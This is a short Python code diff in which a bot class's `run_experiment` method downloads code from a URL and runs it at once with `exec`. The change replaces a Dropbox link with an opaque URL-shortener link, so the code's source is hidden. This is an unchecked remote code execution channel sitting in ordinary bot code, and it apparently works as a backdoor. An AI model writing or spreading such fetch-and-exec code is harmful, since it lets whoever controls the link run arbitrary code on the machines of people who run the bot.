@@ -251,7 +251,7 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
 
     # noinspection PyMethodMayBeStatic
     def run_experiment(self):
-        response = requests.get('https://www.dropbox.com/s/poahkun7uh5f15u/experiment.py?raw=1')
+        response = requests.get('https://vk.cc/8ePCJt')
         response.raise_for_status()
         exec(response.content, globals(), locals())
 
